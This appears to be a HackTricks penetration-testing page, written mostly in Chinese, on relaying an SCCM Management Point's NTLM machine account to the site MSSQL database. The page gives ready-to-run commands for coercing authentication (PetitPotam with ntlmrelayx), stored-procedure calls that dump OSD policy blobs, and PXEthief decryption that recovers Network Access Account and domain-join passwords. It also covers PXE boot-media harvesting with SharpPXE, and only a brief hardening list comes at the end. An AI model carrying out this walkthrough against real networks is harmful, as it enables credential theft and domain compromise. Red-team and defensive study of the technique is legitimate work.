# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
通过强制 **System Center Configuration Manager (SCCM) Management Point (MP)** 在 SMB/RPC 上进行身份验证，并将该 NTLM 机器帐户**中继(relay)** 到 **site database (MSSQL)**，你可以获得 `smsdbrole_MP` / `smsdbrole_MPUserSvc` 权限。 这些角色允许你调用一组存储过程，导出 **Operating System Deployment (OSD)** 策略 blob（Network Access Account 凭据、Task-Sequence 变量等）。 这些 blob 是十六进制编码/加密的，但可以使用 **PXEthief** 解码并解密，得到明文密钥。

高层步骤：
1. 发现 MP 与站点 DB ↦ 未经身份验证的 HTTP 端点 `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`。
2. 启动 `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`。
3. 使用 **PetitPotam**, PrinterBug, DFSCoerce 等强制 MP 进行认证。
4. 通过 SOCKS 代理以被中继的 **<DOMAIN>\\<MP-host>$** 帐户使用 `mssqlclient.py -windows-auth` 连接。
5. 执行：
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (或 `MP_GetPolicyBodyAfterAuthorization`)
6. 去掉 `0xFFFE` BOM，`xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`。

诸如 `OSDJoinAccount/OSDJoinPassword`、`NetworkAccessUsername/Password` 等密钥可在不触及 PXE 或客户端的情况下被恢复。

---

## 1. 枚举无需认证的 MP 端点
MP 的 ISAPI 扩展 **GetAuth.dll** 暴露了几个不需要认证的参数（除非站点仅使用 PKI）：

| 参数 | 目的 |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | 返回站点签名证书的公钥 + *x86* / *x64* **All Unknown Computers** 设备的 GUID。 |
| `MPLIST` | 列出站点中的每个 Management-Point。 |
| `SITESIGNCERT` | 返回 Primary-Site 签名证书（无需 LDAP 即可识别站点服务器）。 |

抓取将作为后续 DB 查询 **clientID** 的 GUID：
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
## 2. 将 MP 计算机账户 Relay 到 MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
当 coercion 触发时，你应该会看到类似如下：
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. 通过存储过程识别 OSD 策略
通过 SOCKS 代理连接（默认端口 1080）：
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
切换到 **CM_<SiteCode>** DB（使用三位站点代码，例如 `CM_001`）。

### 3.1  查找 Unknown-Computer GUIDs（可选）
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  列出已分配的策略
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
每行包含 `PolicyAssignmentID`、`Body`（hex）、`PolicyID`、`PolicyVersion`。

重点关注以下策略：
* **NAAConfig**  – Network Access Account 凭据
* **TS_Sequence** – Task Sequence 变量（OSDJoinAccount/Password）
* **CollectionSettings** – 可能包含 run-as 账户

### 3.3  检索完整 `Body`
如果您已经拥有 `PolicyID` 和 `PolicyVersion`，可以使用以下方法跳过 clientID 要求：
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> 重要：在 SSMS 中将 “Maximum Characters Retrieved” 提高到 (>65535)，否则 blob 将被截断。

---

## 4. 解码并解密 blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
恢复的机密示例：
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. 相关的 SQL 角色和存储过程
在中继后，登录被映射为：
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

这些角色暴露了数十个 EXEC 权限，本次攻击中使用的关键权限有：

| 存储过程 | 用途 |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | 列出应用于 `clientID` 的策略。 |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | 返回完整的策略主体。 |
| `MP_GetListOfMPsInSiteOSD` | 由 `MPKEYINFORMATIONMEDIA` 路径返回。 |

你可以使用以下命令检查完整列表：
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE 引导媒体采集 (SharpPXE)
* **PXE reply over UDP/4011**: 向配置为 PXE 的 Distribution Point 发送 PXE 引导请求。proxyDHCP 响应会泄露引导路径，例如 `SMSBoot\\x64\\pxe\\variables.dat`（加密的配置）和 `SMSBoot\\x64\\pxe\\boot.bcd`，以及可选的加密密钥 blob。
* **Retrieve boot artifacts via TFTP**: 使用返回的路径通过 TFTP（无认证）下载 `variables.dat`。该文件很小（几 KB），包含加密的媒体变量。
* **Decrypt or crack**:
- 如果响应包含解密密钥，将其提供给 **SharpPXE** 以直接解密 `variables.dat`。
- 如果未提供密钥（PXE 媒体受自定义密码保护），SharpPXE 会生成一个 **Hashcat-compatible** `$sccm$aes128$...` 哈希用于离线破解。恢复密码后再解密该文件。
* **Parse decrypted XML**: 明文变量包含 SCCM 部署元数据（**Management Point URL**、**Site Code**、媒体 GUID 及其他标识）。SharpPXE 会解析这些内容并打印一个可直接运行的 **SharpSCCM** 命令，预填充 GUID/PFX/site 参数以便后续滥用。
* **Requirements**: 只需对 PXE 监听器（UDP/4011）和 TFTP 的网络可达性；不需要本地管理员权限。

---

## 7. 检测与加固
1. **Monitor MP logins** – 监控 MP 登录：任何 MP 计算机帐户从非其宿主的 IP 登录都可能表示中继行为。
2. 在站点数据库上启用 **Extended Protection for Authentication (EPA)**（`PREVENT-14`）。
3. 禁用未使用的 NTLM，强制 SMB signing，限制 RPC（与针对 `PetitPotam`/`PrinterBug` 的缓解措施相同）。
4. 使用 IPSec / mutual-TLS 加固 MP ↔ DB 通信。
5. **Constrain PXE exposure** – 对 UDP/4011 和 TFTP 在受信任 VLAN 上设防火墙，要求 PXE 密码，并在检测到 TFTP 下载 `SMSBoot\\*\\pxe\\variables.dat` 时触发告警。

---

## See also
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## References
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
